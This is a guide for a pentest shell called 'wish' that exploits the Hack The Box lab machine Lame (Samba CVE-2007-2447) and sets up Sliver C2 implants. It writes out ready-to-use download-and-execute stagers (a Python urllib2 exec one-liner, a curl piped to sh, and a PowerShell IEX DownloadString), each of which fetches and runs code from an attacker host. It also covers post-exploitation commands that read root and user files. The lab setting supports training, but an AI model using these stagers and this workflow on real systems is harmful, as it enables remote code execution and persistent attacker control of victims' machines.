# HTB Lame - Sliver C2 Integration Guide

This guide explains how to exploit HTB Lame machine using wish's Sliver C2 integration features.

## Overview

HTB Lame (10.10.10.3) is a Linux machine with Samba 3.0.20 vulnerability (CVE-2007-2447). This guide demonstrates the flow from initial access to post-exploitation using wish and Sliver C2.

## Prerequisites

- wish is installed
- Sliver C2 server is running
- Connected to HTB VPN

## Step 1: Reconnaissance and Scanning

```bash
# Start wish
$ wish

# Set scope
> /scope add 10.10.10.3

# Port scan
> scan 10.10.10.3

# Check Samba vulnerability
> check samba vulnerability on 10.10.10.3
```

## Step 2: Preparing Sliver Stager

Prepare Sliver stager using the new stager command system.

```bash
# Check Sliver C2 status
> /sliver status

# Start stager listener (automatically generates Python stager)
> /sliver stager start --host 10.10.14.2

# Example output:
# 🎯 Stager listener started: stg-abc123
# 📡 URL: http://10.10.14.2:54321
# 
# Default Stager (Python):
# python -c "import urllib2,platform;o=platform.system()+'_'+platform.machine();exec(urllib2.urlopen('http://10.10.14.2:54321/s?o='+o).read())"
```

## Step 3: Exploitation

Exploit the Samba vulnerability to execute the stager.

```bash
# Execute exploit (wish automatically selects appropriate exploit)
> exploit samba on 10.10.10.3

# Or execute manually
> execute on 10.10.10.3: python -c "import urllib2,platform;o=platform.system()+'_'+platform.machine();exec(urllib2.urlopen('http://10.10.14.2:54321/s?o='+o).read())"
```

## Step 4: Post-Exploitation

Once Sliver session is established, perform post-exploitation.

```bash
# Check active implants
> /sliver implants

# Start shell session
> /sliver shell FANCY_TIGER

# Or execute commands directly
> /sliver execute FANCY_TIGER whoami
> /sliver execute FANCY_TIGER id
> /sliver execute FANCY_TIGER cat /root/root.txt
> /sliver execute FANCY_TIGER cat /home/makis/user.txt
```

## Step 5: Using Alternative Stagers

Different types of stagers can be used depending on the environment.

```bash
# Bash stager (when wget is available)
> /sliver stager create stg-abc123 --type bash
# Output: curl -s http://10.10.14.2:54321/s?o=$(uname -s)_$(uname -m) | sh

# PowerShell stager (for Windows environments)
> /sliver stager create stg-abc123 --type powershell
# Output: IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2:54321/s?o=Windows_x64')

# VBS stager (for older Windows environments)
> /sliver stager create stg-abc123 --type vbs
```

## Step 6: Cleanup

```bash
# Stop stager listener
> /sliver stager stop stg-abc123

# Check active listeners
> /sliver stager list

# Record findings
> /findings add CVE-2007-2447: Samba RCE exploited via username map script, gained root access
```

## Stager Command Reference

### Basic Commands

```bash
# Start stager listener (auto-generates default Python stager)
/sliver stager start --host <IP> [--port <port>] [--https]

# Stop stager listener
/sliver stager stop <listener-id>

# List active listeners
/sliver stager list

# Generate specific type of stager
/sliver stager create <listener-id> --type <python|bash|powershell|vbs>
```

### Stager Features

1. **Python Stager (default)**
   - Python 2/3 compatible
   - Environment detection (OS/architecture)
   - In-memory execution

2. **Bash Stager**
   - curl/wget based
   - For Unix/Linux environments

3. **PowerShell Stager**
   - For Windows environments
   - In-memory execution

4. **VBS Stager**
   - For legacy Windows environments
   - File-based execution

## Troubleshooting

### When Stager Doesn't Execute

1. Check network connection
```bash
# Verify connection from target to attacker machine
> /sliver execute TARGET ping -c 1 10.10.14.2
```

2. Check firewall settings
```bash
# Verify stager listener port is open
$ sudo netstat -tlnp | grep 54321
```

3. Try alternative stager type
```bash
# Use Bash stager if Python is not available
> /sliver stager create stg-abc123 --type bash
```

### When Session is Not Established

1. Check Sliver C2 server status
```bash
> /sliver status
```

2. Check error logs
```bash
# Check Sliver server logs
$ sliver-server
[server] > listeners
```

## Summary

The new stager command system in wish makes Sliver C2 integration more intuitive. With a single `/sliver stager start` command, a default Python stager is automatically generated and ready to use. Different types of stagers can be selected based on the environment, making it compatible with various target environments.